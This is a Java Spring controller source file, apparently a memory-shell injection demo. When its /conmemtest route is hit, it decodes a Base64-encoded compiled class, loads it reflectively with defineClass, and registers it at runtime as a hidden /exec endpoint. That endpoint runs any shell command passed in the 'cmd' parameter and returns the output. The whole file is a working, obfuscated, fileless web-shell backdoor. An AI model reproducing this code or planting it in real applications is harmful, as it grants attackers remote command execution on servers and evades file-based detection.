package com.axisx.common.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Method;
import java.util.Base64;

@Controller
public class InjectControllerMem {
    private static Object MEMSHELL_OBJECT;
    private static final String method_name = "index";

    @RequestMapping("/conmemtest")
    public void index(HttpServletRequest request, HttpServletResponse response) {
        InjectMemClass();
        InjectMem();
    }

    private static synchronized void InjectMem() {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            // 2. 通过反射获得自定义Controller中路径调用的Method对象，反射时需要填入Method对应的参数
            Method method2 = MEMSHELL_OBJECT.getClass().getMethod(method_name,HttpServletRequest.class,HttpServletResponse.class);
            // 3. 定义访问 controller 的 URL 地址
            PatternsRequestCondition url = new PatternsRequestCondition("/exec");
            // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            // 5. 在内存中动态注册Controller
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);

            mappingHandlerMapping.registerMapping(info, MEMSHELL_OBJECT, method2);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static synchronized void InjectMemClass() {
        try {
            // TestController
            byte[] var2 = Base64.getDecoder().decode("yv66vgAAADQAgwoAGgBOCAAqCwBPAFAKABkAUQsAUgBTCgBUAFUHAFYKAFcAWAoAVwBZCgBaAFsHAFwKAAsAXQcAXgoADQBfBwBgCgAPAE4KAA0AYQcAYgoAEgBOCgASAGMIAGQKABIAZQoADwBmCgAPAGUHAGcHAGgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExUZXN0Q29udHJvbGxlcjsBAAVpbmRleAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAZyZXN1bHQBABJMamF2YS9sYW5nL1N0cmluZzsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAZwcAaQcAagcAawcAVgEACkV4Y2VwdGlvbnMBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQA4TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZzsBAAV2YWx1ZQEABS9leGVjAQALQ29tbWFuZEV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAnJ0AQATTGphdmEvbGFuZy9SdW50aW1lOwEABHByb2MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3RkZXJyAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQADaXNyAQAbTGphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXI7AQACYnIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsHAGwHAG0HAG4HAFwHAF4HAGABAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQEAK0xvcmcvc3ByaW5nZnJhbWV3b3JrL3N0ZXJlb3R5cGUvQ29udHJvbGxlcjsMABsAHAcAaQwAbwA3DAA2ADcHAGoMAHAAcQcAcgwAcwB0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAbAwAdQB2DAB3AHgHAG0MAHkAegEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMABsAewEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIMABsAfAEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIMAH0AfgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAB/AIABAAEKDACBAH4MAH8AggEADlRlc3RDb250cm9sbGVyAQAQamF2YS9sYW5nL09iamVjdAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAEGphdmEvbGFuZy9TdHJpbmcBABFqYXZhL2xhbmcvUnVudGltZQEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEADGdldFBhcmFtZXRlcgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsAIQAZABoAAAAAAAMAAQAbABwAAQAdAAAALwABAAEAAAAFKrcAAbEAAAACAB4AAAAGAAEAAAALAB8AAAAMAAEAAAAFACAAIQAAAAEAIgAjAAMAHQAAAK4AAgAFAAAAISsSArkAAwIATiottgAEOgQsuQAFAQAZBLYABqcABToEsQABAAkAGwAeAAcAAwAeAAAAGgAGAAAADgAJABEAEAASABsAFAAeABMAIAAVAB8AAAA0AAUAEAALACQAJQAEAAAAIQAgACEAAAAAACEAJgAnAAEAAAAhACgAKQACAAkAGAAqACUAAwArAAAAGQAC/wAeAAQHACwHAC0HAC4HAC8AAQcAMAEAMQAAAAQAAQAHADIAAAAOAAEAMwABADRbAAFzADUAAQA2ADcAAgAdAAABKQADAAkAAABguAAITSwrtgAJTi22AAo6BLsAC1kZBLcADDoFuwANWRkFtwAOOgYBOge7AA9ZtwAQOggZBrYAEVk6B8YAIBkIuwASWbcAExkHtgAUEhW2ABS2ABa2ABdXp//bGQi2ABiwAAAAAwAeAAAAKgAKAAAAGAAEABkACgAaABAAGwAbABwAJgAdACkAHgAyACAAPQAhAFoAJAAfAAAAXAAJAAAAYAAgACEAAAAAAGAAKgAlAAEABABcADgAOQACAAoAVgA6ADsAAwAQAFAAPAA9AAQAGwBFAD4APwAFACYAOgBAAEEABgApADcAQgAlAAcAMgAuAEMARAAIACsAAAAlAAL/ADIACQcALAcALwcARQcARgcARwcASAcASQcALwcASgAAJwAxAAAABAABAAcAAgBLAAAAAgBMADIAAAAGAAEATQAA");
            Method var1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            var1.setAccessible(true);

            Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);
            MEMSHELL_OBJECT = var3.newInstance();
        } catch (Exception var4) {
            var4.printStackTrace();
        }
    }
}
